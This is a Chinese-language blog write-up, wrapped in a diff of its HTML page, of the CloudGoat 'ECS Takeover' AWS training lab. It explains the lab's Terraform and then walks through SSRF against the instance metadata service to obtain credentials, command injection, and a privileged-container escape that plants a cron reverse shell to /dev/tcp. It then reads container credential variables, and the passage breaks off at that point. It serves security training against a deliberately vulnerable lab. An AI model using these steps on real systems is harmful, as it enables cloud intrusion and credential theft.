@@ -1,0 +1,864 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>[CloudGoat]ECS Takeover | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="[CloudGoat]ECS Takeover | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="ECS快速入门
+Amazon Elastic Container Service (Amazon ECS) 是AWS上的一个容器编排服务，它和K8s的区别在于ECS是Amazon自己实现的容器编排方案，而K8s是Google的开源容器编排解..." />
+    <meta name="keywords" content="ECS,CloudGoat,Terraform,云安全,AWS" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              [CloudGoat]ECS Takeover
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-07-15
+              </span>
+              <span>
+                22 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/H7j08QruO/" class="post-tag">
+                  # ECS
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/udTQ5jCzp/" class="post-tag">
+                  # CloudGoat
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/IM02GT8L2N/" class="post-tag">
+                  # Terraform
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/8Ilrlif21/" class="post-tag">
+                  # 云安全
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/su2_uaPzNg/" class="post-tag">
+                  # AWS
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/cloudgoatecs-takeover.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="ecs快速入门">ECS快速入门</h1>
+<p>Amazon Elastic Container Service (Amazon ECS) 是AWS上的一个容器编排服务，它和K8s的区别在于ECS是Amazon自己实现的容器编排方案，而K8s是Google的开源容器编排解决方案。</p>
+<p>通过下面的图快速了解下ECS的各个组件<br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720886254514-106f0f9a-96c6-469b-8e6b-7cbf1258cd8e.png" alt="image.png" loading="lazy"></p>
+<ul>
+<li>Cluster manager 可以管理一个 Cluster 上的所有 Contaienr Instance。</li>
+<li>Contaienr Instance 是一个 Linux 主机，上面运行着 Docker Engine 和 ECS Container Agent。Contaienr Instance 会向 Cluster manager 注册来让其对自己进行管理。</li>
+<li>Service 是一个任务清单，Cluster manager 会通过各种方式在 Contaienr Instance 上实现/维持这些任务。一个 Service 中包含 Task Number 和 Task Definition。
+<ul>
+<li>Task Number 指的是 Task 的数量。</li>
+<li>Task Definition 则是 Task 的具体内容，它包括一个 Container Definitions。Container Definitions 则是一个镜像和镜像的启动命令。</li>
+</ul>
+</li>
+<li>Role 管理，在整个 ECS 中涉及4个 Role，其中 Service Role🔵 和 Task Execution Role🟠 属于功能 Role 用户不用太关心。剩下两个，Task Role🟣 是为具体执行任务的 Container 提供的 Role，它所涉及的云资源的使用要用户提供；一台 Contaienr Instance 上的 Container 还可以使用这台 Contaienr Instance Role🔴 的资源。</li>
+</ul>
+<p>值得一提的是，上面的 ECS 是 EC2 Mode。除此之外 AWS 还提供了一个 Fargate 的 ECS，在 Fargate 中 Contaienr Instance 在用户视角中将完全隐藏，这样用户就可以更专注于 Service 的编写。<br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721052962707-ed760d33-d084-4e64-b930-b24cba9dadc8.png" alt="image.png" loading="lazy"></p>
+<h1 id="tf代码分析">TF代码分析</h1>
+<p>除去provider.tf、outputs.tf、variables.tf，各个资源都是类别名称对应自己的 tf 文件<br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720887770678-b7088e85-1469-4cac-88e5-2e7c4ece50b0.png" alt="image.png" loading="lazy"></p>
+<h2 id="vpctf">vpc.tf</h2>
+<p>在将ECS启动前，需要有一个承载这些资源的VPC。代码首先定义的一个VPC的基本内容，包括一个VPC，同时为VPC添加一个网关和一个子网。</p>
+<pre><code class="language-yaml">resource &quot;aws_vpc&quot; &quot;vpc&quot; {
+  cidr_block           = &quot;10.0.0.0/16&quot;
+  enable_dns_support   = true
+  enable_dns_hostnames = true
+
+  tags = {
+    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-main&quot;
+  }
+}
+
+resource &quot;aws_internet_gateway&quot; &quot;internet_gateway&quot; {
+  vpc_id = aws_vpc.vpc.id
+
+  tags = {
+    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-main&quot;
+  }
+}
+
+resource &quot;aws_subnet&quot; &quot;public&quot; {
+  vpc_id            = aws_vpc.vpc.id
+  availability_zone = &quot;us-east-1a&quot;
+  cidr_block        = &quot;10.0.1.0/24&quot;
+
+  tags = {
+    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-public&quot;
+  }
+}
+</code></pre>
+<p>接着创建了指向网关的默认路由，同时将该路由与子网关联</p>
+<pre><code class="language-yaml">resource &quot;aws_route_table&quot; &quot;public&quot; {
+  vpc_id = aws_vpc.vpc.id
+
+  route {
+    cidr_block = &quot;0.0.0.0/0&quot;
+    gateway_id = aws_internet_gateway.internet_gateway.id
+  }
+
+  tags = {
+    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-public&quot;
+  }
+}
+
+resource &quot;aws_route_table_association&quot; &quot;route_table_association&quot; {
+  subnet_id      = aws_subnet.public.id
+  route_table_id = aws_route_table.public.id
+}
+</code></pre>
+<p>最后在VPC中定义了一个安全组允许 TCP 流量到端口 80 (HTTP) 和端口 443 (HTTPS)。源 IP 地址范围则根据 <code>var.cg_whitelist</code> 来确定，这个其实就是 CloudGoat 配置时的 whitelist 选项（0.0.0.0/0）。</p>
+<pre><code class="language-yaml">resource &quot;aws_security_group&quot; &quot;ecs_sg&quot; {
+  vpc_id                 = aws_vpc.vpc.id
+  revoke_rules_on_delete = true
+
+  ingress {
+    from_port   = 80
+    to_port     = 80
+    protocol    = &quot;tcp&quot;
+    cidr_blocks = var.cg_whitelist
+  }
+
+  ingress {
+    from_port   = 443
+    to_port     = 443
+    protocol    = &quot;tcp&quot;
+    cidr_blocks = var.cg_whitelist
+  }
+
+  egress {
+    from_port   = 0
+    to_port     = 65535
+    protocol    = &quot;tcp&quot;
+    cidr_blocks = [&quot;0.0.0.0/0&quot;]
+  }
+
+  tags = {
+    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-ecs-sg&quot;
+  }
+}
+</code></pre>
+<h2 id="iamtf">iam.tf</h2>
+<p>iam.tf里面定义了两个 IAM Role，供 Contaienr Instance 使用的 <code>ecs_agent</code> 和供 Task 使用的 <code>privd</code></p>
+<pre><code class="language-yaml">//
+// ECS Worker Instance Role
+//
+data &quot;aws_iam_policy_document&quot; &quot;ecs_agent&quot; {
+  statement {
+    actions = [&quot;sts:AssumeRole&quot;]
+
+    principals {
+      type        = &quot;Service&quot;
+      identifiers = [&quot;ec2.amazonaws.com&quot;]
+    }
+  }
+}
+
+resource &quot;aws_iam_role&quot; &quot;ecs_agent&quot; {
+  name               = &quot;cg-${var.scenario-name}-${var.cgid}-ecs-agent&quot;
+  assume_role_policy = data.aws_iam_policy_document.ecs_agent.json
+}
+
+
+resource &quot;aws_iam_role_policy_attachment&quot; &quot;ecs_agent&quot; {
+  role       = aws_iam_role.ecs_agent.name
+  policy_arn = &quot;arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role&quot;
+}
+
+resource &quot;aws_iam_instance_profile&quot; &quot;ecs_agent&quot; {
+  name = &quot;cg-${var.scenario-name}-${var.cgid}-ecs-agent&quot;
+  role = aws_iam_role.ecs_agent.name
+}
+
+
+
+//
+//  ECS Container role
+//
+
+data &quot;aws_iam_policy_document&quot; &quot;ecs_tasks_role&quot; {
+  statement {
+    actions = [&quot;sts:AssumeRole&quot;]
+
+    principals {
+      type        = &quot;Service&quot;
+      identifiers = [&quot;ecs-tasks.amazonaws.com&quot;]
+    }
+  }
+}
+
+
+
+resource &quot;aws_iam_role&quot; &quot;privd&quot; {
+  name                = &quot;cg-${var.scenario-name}-${var.cgid}-privd&quot;
+  assume_role_policy  = data.aws_iam_policy_document.ecs_tasks_role.json
+  managed_policy_arns = [aws_iam_policy.privd.arn]
+}
+
+// Give the role read access to ecs and IAM permissions.
+resource &quot;aws_iam_policy&quot; &quot;privd&quot; {
+  name = &quot;cg-${var.scenario-name}-${var.cgid}-privd&quot;
+
+  policy = jsonencode({
+    Version = &quot;2012-10-17&quot;
+    Statement = [
+      {
+        Action = [
+          &quot;ecs:ListServices&quot;,
+          &quot;ecs:ListTasks&quot;,
+          &quot;ecs:DescribeServices&quot;,
+          &quot;ecs:ListContainerInstances&quot;,
+          &quot;ecs:DescribeContainerInstances&quot;,
+          &quot;ecs:DescribeTasks&quot;,
+          &quot;ecs:ListTaskDefinitions&quot;,
+          &quot;ecs:DescribeClusters&quot;,
+          &quot;ecs:ListClusters&quot;,
+          &quot;iam:GetPolicyVersion&quot;,
+          &quot;iam:GetPolicy&quot;,
+          &quot;iam:ListAttachedRolePolicies&quot;,
+          &quot;iam:GetRolePolicy&quot;
+        ]
+        Effect   = &quot;Allow&quot;
+        Resource = &quot;*&quot;
+      },
+    ]
+  })
+}
+</code></pre>
+<p>其中<code>ecs_agent</code>直接使用的AWS托管策略<code>AmazonEC2ContainerServiceforEC2Role</code>。根据对该策略的描述，这是一个ECS中EC2的默认策略。其中包括对 CloudWatch Logs、EC2、Elastic Container Registry、Elastic Container Service 的有限访问。<br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720890039990-0cd1019a-7de0-4a9a-8b72-8f2c9e3490fb.png" alt="image.png" loading="lazy"></p>
+<p>而<code>privd</code>策略涉及对 AWS ECS 和 IAM 服务的查询和获取信息的操作。</p>
+<pre><code class="language-yaml">{
+  Action = [
+    &quot;ecs:ListServices&quot;,
+    &quot;ecs:ListTasks&quot;,
+    &quot;ecs:DescribeServices&quot;,
+    &quot;ecs:ListContainerInstances&quot;,
+    &quot;ecs:DescribeContainerInstances&quot;,
+    &quot;ecs:DescribeTasks&quot;,
+    &quot;ecs:ListTaskDefinitions&quot;,
+    &quot;ecs:DescribeClusters&quot;,
+    &quot;ecs:ListClusters&quot;,
+    &quot;iam:GetPolicyVersion&quot;,
+    &quot;iam:GetPolicy&quot;,
+    &quot;iam:ListAttachedRolePolicies&quot;,
+    &quot;iam:GetRolePolicy&quot;
+  ]
+  Effect   = &quot;Allow&quot;
+  Resource = &quot;*&quot;
+}
+</code></pre>
+<h2 id="ec2tf">ec2.tf</h2>
+<p>ec2.tf主要定义了两个 EC2 实例。其中它们使用了 AWS 官方为 ECS 服务定制的 AMI</p>
+<pre><code class="language-yaml">data &quot;aws_ami&quot; &quot;ecs&quot; {
+  most_recent = true
+  owners      = [&quot;amazon&quot;]
+
+  filter {
+    name   = &quot;name&quot;
+    values = [&quot;amzn2-ami-ecs-hvm-*&quot;]
+  }
+
+  filter {
+    name   = &quot;virtualization-type&quot;
+    values = [&quot;hvm&quot;]
+  }
+
+  filter {
+    name   = &quot;architecture&quot;
+    values = [&quot;x86_64&quot;]
+  }
+}
+</code></pre>
+<p>下面这段<code>user_data</code>是让 EC2 实例启动的时候执行命令<code>echo ECS_CLUSTER=${aws_ecs_cluster.ecs_cluster.name} &gt;&gt; /etc/ecs/ecs.config</code>来自动加入 cluster</p>
+<pre><code class="language-yaml">locals {
+  user_data = &lt;&lt;EOH
+#!/bin/bash
+echo ECS_CLUSTER=${aws_ecs_cluster.ecs_cluster.name} &gt;&gt; /etc/ecs/ecs.config
+EOH
+}
+</code></pre>
+<p>除此之外，还有关联的角色和安全组的配置，均是前面配置好的。同时这两个 EC2 都关联了公网 IP <code>associate_public_ip_address = true</code></p>
+<pre><code class="language-yaml">resource &quot;aws_instance&quot; &quot;vulnsite&quot; {
+  ami                         = data.aws_ami.ecs.id
+  iam_instance_profile        = aws_iam_instance_profile.ecs_agent.name
+  vpc_security_group_ids      = [aws_security_group.ecs_sg.id]
+  user_data                   = local.user_data
+  instance_type               = &quot;t2.micro&quot;
+  associate_public_ip_address = true
+  subnet_id                   = aws_subnet.public.id
+
+  tags = {
+    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-vulnsite&quot;
+  }
+}
+
+resource &quot;aws_instance&quot; &quot;vault&quot; {
+  ami                         = data.aws_ami.ecs.id
+  iam_instance_profile        = aws_iam_instance_profile.ecs_agent.name
+  vpc_security_group_ids      = [aws_security_group.ecs_sg.id]
+  user_data                   = local.user_data
+  instance_type               = &quot;t2.micro&quot;
+  associate_public_ip_address = true
+  subnet_id                   = aws_subnet.public.id
+
+  tags = {
+    &quot;Name&quot; = &quot;cg-${var.scenario-name}-${var.cgid}-vault&quot;
+  }
+}
+</code></pre>
+<h2 id="ecstf">ecs.tf</h2>
+<p>ecs.tf大致可以分为三部分：</p>
+<ul>
+<li>定义 Cluster</li>
+<li>定义 Task Definition</li>
+<li>定义 Service</li>
+</ul>
+<p>定义 Cluster 比较简单只包含一个 name 参数</p>
+<pre><code class="language-yaml">resource &quot;aws_ecs_cluster&quot; &quot;ecs_cluster&quot; {
+  name = &quot;${var.scenario-name}-${var.cgid}-cluster&quot;
+}
+</code></pre>
+<p>然后是三个 Task Definition 的定义，这里看下最后一个<code>vulnsite</code></p>
+<ul>
+<li>任务定义基本配置
+<ul>
+<li><code>family</code>: 任务定义的家族名，这里使用 Terraform 变量 <code>var.scenario-name</code> 和 <code>var.cgid</code> 动态生成。差不多就是一个名称。</li>
+<li><code>network_mode</code>: 设置为 <code>&quot;host&quot;</code>，表明任务将使用宿主机的网络命名空间。在这种模式下，容器将直接使用宿主机的网络，不会虚拟化或隔离网络。</li>
+</ul>
+</li>
+<li>容器定义
+<ul>
+<li><code>name</code>: 容器的名称，设为 <code>&quot;vulnsite&quot;</code>。</li>
+<li><code>image</code>: 容器使用的镜像，这里是 <code>&quot;cloudgoat/ecs-takeover-vulnsite:latest&quot;</code>，表示使用最新版本的 cloudgoat/ecs-takeover-vulnsite 镜像。</li>
+<li><code>essential</code>: 设置为 <code>true</code>，表示这个容器必须在运行时始终处于运行状态；如果它失败，ECS 将停止整个任务。</li>
+<li><code>privileged</code>: 设置为 <code>true</code>，赋予容器提升的权限，允许它访问宿主机的资源，这在需要执行特定系统操作的情况下是必需的。</li>
+<li><code>network_mode</code>: 指定了 <code>&quot;awsvpc&quot;</code>。根据过往文档的描述<code>awsvpc</code>网络模式提供的任务联网功能使 Amazon ECS 任务具有与 Amazon EC2 实例相同的联网属性。感觉和前面的<code>network_mode: &quot;host&quot;</code>有点相似，不知道是配合使用还是冲突设置。</li>
+<li><code>cpu</code> 和 <code>memory</code>: 分别设置容器的 CPU 和内存限制，这里是 256 CPU 单位和 256 MB 内存。</li>
+<li><code>portMappings</code>: 定义端口映射，这里将容器的 80 端口映射到宿主机的 80 端口，使容器可以处理 HTTP 流量。</li>
+<li><code>mountPoints</code>: 定义挂载点，和后面的<code>volume</code>选项配合，里将宿主机的 <code>/var/run/docker.sock</code> 挂载到容器的相同路径上。这通常用于允许容器内的应用管理宿主机上的 Docker 守护进程。</li>
+</ul>
+</li>
+<li>卷定义
+<ul>
+<li><code>name</code>: 卷的名称 <code>&quot;docker-socket&quot;</code>。</li>
+<li><code>host_path</code>: 定义宿主机上的路径 <code>/var/run/docker.sock</code>。这允许容器通过 Docker 套接字与宿主机的 Docker 守护进程交互。</li>
+</ul>
+</li>
+</ul>
+<p>特权模式+<code>/var/run/docker.sock</code>挂载，这个容器的危险性已不言而喻。</p>
+<pre><code class="language-yaml">resource &quot;aws_ecs_task_definition&quot; &quot;vault&quot; {
+  family = &quot;cg-${var.scenario-name}-${var.cgid}-vault&quot;
+
+  # Wait for the website to be deployed to the cluster.
+  # This should make sure the instances are available.
+  container_definitions = jsonencode([
+    {
+      name      = &quot;vault&quot;
+      image     = &quot;busybox:latest&quot;
+      essential = true
+      cpu       = 50
+      memory    = 50
+      command   = [&quot;/bin/sh -c \&quot;echo '{{FLAG_1234677}}' &gt;  /FLAG.TXT; sleep 365d\&quot;&quot;]
+      entryPoint = [
+        &quot;sh&quot;,
+        &quot;-c&quot;
+      ]
+    }
+  ])
+}
+
+// Hosts the role we want to use to force rescheduling
+resource &quot;aws_ecs_task_definition&quot; &quot;privd&quot; {
+  family        = &quot;cg-${var.scenario-name}-${var.cgid}-privd&quot;
+  task_role_arn = aws_iam_role.privd.arn
+  container_definitions = jsonencode([
+    {
+      name      = &quot;privd&quot;
+      image     = &quot;busybox:latest&quot;
+      cpu       = 50
+      memory    = 50
+      essential = true
+      command   = [&quot;sleep&quot;, &quot;365d&quot;]
+    }
+  ])
+}
+
+// Hosts website to container escape execution
+resource &quot;aws_ecs_task_definition&quot; &quot;vulnsite&quot; {
+  family       = &quot;cg-${var.scenario-name}-${var.cgid}-vulnsite&quot;
+  network_mode = &quot;host&quot;
+  container_definitions = jsonencode([
+    {
+      name         = &quot;vulnsite&quot;
+      image        = &quot;cloudgoat/ecs-takeover-vulnsite:latest&quot;
+      essential    = true
+      privileged   = true
+      network_mode = &quot;awsvpc&quot;
+      cpu          = 256
+      memory       = 256
+      portMappings = [
+        {
+          containerPort = 80
+          hostPort      = 80
+        }
+      ]
+      mountPoints = [
+        {
+          readOnly      = false,
+          containerPath = &quot;/var/run/docker.sock&quot;
+          sourceVolume  = &quot;docker-socket&quot;
+        }
+      ]
+    }
+  ])
+
+  volume {
+    name      = &quot;docker-socket&quot;
+    host_path = &quot;/var/run/docker.sock&quot;
+  }
+}
+</code></pre>
+<p>最后是三个 Service 的定义。<code>vulnsite</code>通过<code>memberOf</code>类型的约束，让任务的部署必须满足表达式<code>ec2InstanceId == ${aws_instance.vulnsite.id}</code>，也就是指定了 EC2 实例 ID。</p>
+<pre><code class="language-yaml">resource &quot;aws_ecs_service&quot; &quot;vulnsite&quot; {
+  name            = &quot;vulnsite&quot;
+  cluster         = aws_ecs_cluster.ecs_cluster.id
+  task_definition = aws_ecs_task_definition.vulnsite.arn
+  desired_count   = 1
+
+  placement_constraints {
+    type       = &quot;memberOf&quot;
+    expression = &quot;ec2InstanceId == ${aws_instance.vulnsite.id}&quot;
+  }
+}
+</code></pre>
+<p>预置器(Provisioner)是由 Terraform 所提供的另一组插件，每种预置器可以在资源对象创建后执行不同类型的操作。<code>vault</code>中的<code>Provisioner</code>表示在创建资源后执行一个Python脚本<code>remove_placement_constraints.py</code>，同时配置了执行这个脚本的环境变量。</p>
+<pre><code class="language-yaml">resource &quot;aws_ecs_service&quot; &quot;vault&quot; {
+  name                 = &quot;vault&quot;
+  cluster              = aws_ecs_cluster.ecs_cluster.id
+  task_definition      = aws_ecs_task_definition.vault.arn
+  force_new_deployment = true
+  desired_count        = 1
+
+
+  depends_on = [
+    aws_ecs_service.vulnsite,
+  ]
+
+  ordered_placement_strategy {
+    type = &quot;random&quot;
+  }
+
+  // Setting this here ensures vault start's on the right instance, this setting is removed in the provisioner below.
+  placement_constraints {
+    type       = &quot;memberOf&quot;
+    expression = &quot;ec2InstanceId == ${aws_instance.vault.id}&quot;
+  }
+
+  provisioner &quot;local-exec&quot; {
+    command = &quot;/usr/bin/env python3 remove_placement_constraints.py&quot;
+    environment = {
+      CLUSTER            = self.cluster
+      SERVICE_NAME       = self.name
+      AWS_DEFAULT_REGION = var.region
+      AWS_PROFILE        = var.profile
+    }
+  }
+}
+
+</code></pre>
+<p><code>remove_placement_constraints.py</code>脚本则是在vault服务启动后移除服务的放置限制</p>
+<pre><code class="language-python">&quot;&quot;&quot;Removes the PlacmentConstraints set for a given cluster/service.&quot;&quot;&quot;
+import boto3
+import time
+from os import environ
+
+ecs = boto3.client('ecs', region_name='us-east-1')
+
+cluster = environ['CLUSTER']
+service_name = environ['SERVICE_NAME']
+
+while True:
+    resp = ecs.list_tasks(
+        cluster=cluster,
+        serviceName=service_name,
+        desiredStatus=&quot;RUNNING&quot;,
+    )
+    if len(resp['taskArns']) &gt; 0:
+        break
+
+    print(f&quot;Waiting for tasks in the service {service_name} to enter the the RUNNING state.&quot;)
+    time.sleep(5)
+
+ecs.update_service(
+    cluster=cluster,
+    service=service_name,
+    placementConstraints=[],
+)
+</code></pre>
+<h2 id="outputstf">outputs.tf</h2>
+<p>最后的<code>outputs.tf</code>将实例的<code>public_dns</code>属性输出，这是AWS 为每个具有公网 IP 的 EC2 实例自动分配一个公共 DNS 名称。</p>
+<pre><code class="language-yaml">output &quot;vuln-site&quot; {
+  value = aws_instance.vulnsite.public_dns
+}
+</code></pre>
+<p>关于DNS解析的配置有两个部分，首先是实例中配置了关联公网IP</p>
+<pre><code class="language-yaml">resource &quot;aws_instance&quot; &quot;vulnsite&quot; {
+  ...
+  associate_public_ip_address = true
+  ...
+}
+</code></pre>
+<p>此外，AWS VPC 中有两个相关的 DNS 设置：<code>enable_dns_support</code> 和 <code>enable_dns_hostnames</code>。<code>enable_dns_support</code> 控制 VPC 是否使用 Amazon-provided DNS 服务器解析 DNS 查询，而 <code>enable_dns_hostnames</code> 控制是否自动为 VPC 中的实例分配 DNS 主机名。</p>
+<pre><code class="language-yaml">resource &quot;aws_vpc&quot; &quot;example&quot; {
+  ...
+  enable_dns_support   = true
+  enable_dns_hostnames = true
+  ...
+}
+</code></pre>
+<h1 id="scenario-ecs_takeover">Scenario: ecs_takeover</h1>
+<h2 id="背景">背景</h2>
+<p>Scenario Resources</p>
+<ul>
+<li>1 VPC and Subnet with:</li>
+<li>2 EC2 Instances</li>
+<li>1 ECS Cluster</li>
+<li>3 ECS Services</li>
+<li>1 Internet Gateway</li>
+</ul>
+<p>Scenario Start(s)</p>
+<ul>
+<li>Access the external website via the EC2 Instance's public IP.</li>
+</ul>
+<p>Scenario Goal(s)</p>
+<ul>
+<li>Gain access to the &quot;vault&quot; container and retrieve the flag.</li>
+</ul>
+<h2 id="渗透流程">渗透流程</h2>
+<p>访问起始的URL，这里存在一个SSRF漏洞<br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720954153030-b697fca4-2527-4a8b-9297-f26b0f45423a.png" alt="image.png" loading="lazy"></p>
+<p>获取关联角色<code>?url=169.254.169.254/latest/meta-data/iam/security-credentials/cg-ecs-takeover-ecs_takeover_cgid1cex40y24h-ecs-agent/</code><br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720954269075-742cc574-4b57-4e91-9fc0-07a7f91b202a.png" alt="image.png" loading="lazy"></p>
+<p>登录的角色是<code>ecs-agent</code>，前面我们知道了这个角色的策略是<code>AmazonEC2ContainerServiceforEC2Role</code><br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720954606056-80352c0b-1fd5-4526-96b7-8679ed81ffa4.png" alt="image.png" loading="lazy"></p>
+<p>除此之外这个输入还存在命令注入<code>/?url=;echo 'hello'</code>。<br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721050913846-f97b6ff0-f0a7-48ed-a142-9708f44a6e2d.png" alt="image.png" loading="lazy"><br>
+既然存在命令注入，那首先判断下这是不是个容器环境，使用的命令为<code>cat /proc/1/cgroup</code>。有点意外的是 ECS 服务所起的容器的<code>cgroup</code>子系统都归到了<code>/ecs/[id-1]/[id-2]</code>这个路径下，和 docker 的<code>docker/[容器ID]</code>有点不同。具体原因现在先不管，总之这里判断出了当前环境是在一个 docker 里面的。<br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720956048593-7bb54b01-38e1-44a5-8997-439843ca9258.png" alt="image.png" loading="lazy"></p>
+<p>在前面我们（偷偷地）知道了这个容器有两个危险的配置，一个是特权模式</p>
+<pre><code class="language-yaml">cat /proc/$$/status | grep CapEff
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720956287499-bd7901f3-546a-4a01-93b3-bb21561d3979.png" alt="image.png" loading="lazy"></figure>
+<p>一个是docker socket挂载</p>
+<pre><code class="language-yaml">ls -lah /var/run/docker.sock
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1720956353451-73921687-3537-4c2e-8668-d10860466640.png" alt="image.png" loading="lazy"></figure>
+<p>这两种漏洞都可以来做容器逃逸，这里要我们使用特权模式逃逸。</p>
+<p>查看挂载磁盘设备</p>
+<pre><code class="language-json">fdisk -l
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721028459040-664b6bdd-6463-417f-ba61-ebc645650e4f.png" alt="image.png" loading="lazy"></figure>
+<p>将宿主机文件挂载到容器的<code>./test</code>目录下</p>
+<pre><code class="language-yaml">mkdir ./test &amp;&amp; mount /dev/xvda1 ./test
+</code></pre>
+<p>写计划任务前还是要简单判断下主机的系统</p>
+<ul>
+<li>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code></li>
+<li>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code>，同时文件权限必须要<code>600</code>才能执行</li>
+</ul>
+<p>这里<code>/var/spool/cron/</code>下直接是空的，所以我们把crontrab定时文件写到<code>./test/var/spool/cron/root</code>。稍等一会儿后收到反弹shell</p>
+<pre><code class="language-yaml">echo &quot;* * * * * /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/ip/9999  0&gt;&amp;1'&quot; &gt;&gt; ./test/var/spool/cron/root
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721031745685-413b3765-7728-46d7-9d03-ac7c893dbe2e.png" alt="image.png" loading="lazy"></figure>
+<p>控制主机后，查看运行的容器信息。第一个是web服务的容器，第二个任务（从前面偷偷知道）是有 Task Role 的</p>
+<pre><code class="language-yaml">docker ps -a
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721032426974-e6ddad38-65e5-4b41-9890-9c7596ebe51e.png" alt="image.png" loading="lazy"></figure>
+<p>而这里除了两个任务容器外，还有一个由<code>amazon-ecs-agent</code>镜像启动的容器。这个就是实例自动安装 ECS 容器代理，参考：<a href="https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/ecs-agent-install.html">https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/ecs-agent-install.html</a><br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721035135592-8c19cd99-99b6-4eec-a925-ce67e66ea51d.png" alt="image.png" loading="lazy"></p>
+<p>虽然我们获取了 Container Instances Role 但对整个集群的其他信息还无法感知，因为<code>AmazonEC2ContainerServiceforEC2Role</code>对集群没有任何读取权限。<br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721032568375-5461eab4-77a9-4846-875e-9877e3527667.png" alt="image.png" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721032603603-ce61dec6-1733-4f75-b41f-20f2f835a921.png" alt="image.png" loading="lazy"></p>
+<p>因此我们将目标转为 <code>privd</code> 容器的 Task Role，和 EC2 实例元数据一样。ECS 中也有任务元数据，获取方式和实例元数据一样可以用HTTP的方式。<a href="https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/ec2-metadata.html">https://docs.aws.amazon.com/zh_cn/AmazonECS/latest/developerguide/ec2-metadata.html</a><br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721051828122-a8b8ce80-c4f9-449f-b216-61e12b1cf02a.png" alt="image.png" loading="lazy"></p>
+<p>不过文档中并没有说明 Task Role 的凭证可以通过任务元数据获取。关于 Task Role 的凭证获取是在 Container credential provider 的部分<a href="https://docs.aws.amazon.com/sdkref/latest/guide/feature-container-credentials.html">https://docs.aws.amazon.com/sdkref/latest/guide/feature-container-credentials.html</a>。根据文档的描述这似乎更像一种开发规范，获取的路径在容器的环境变量里<br>
+<img src="https://skyblu3519.github.io/post-images/ecs_takeover/1721052193373-46614cc1-a83a-4f90-888c-26a5d749517a.png" alt="image.png" loading="lazy"></p>
+<p>打印第二个容器的环境变量，看到了<code>AWS_CONTAINER_CREDENTIALS_RELATIVE_URI</code>的环境变量</p>
+<pre><code class="language-json">docker exec 38a2028763d2 sh -c 'printenv'
+HOSTNAME=38a2028763d2
+SHLVL=1
+HOME=/root
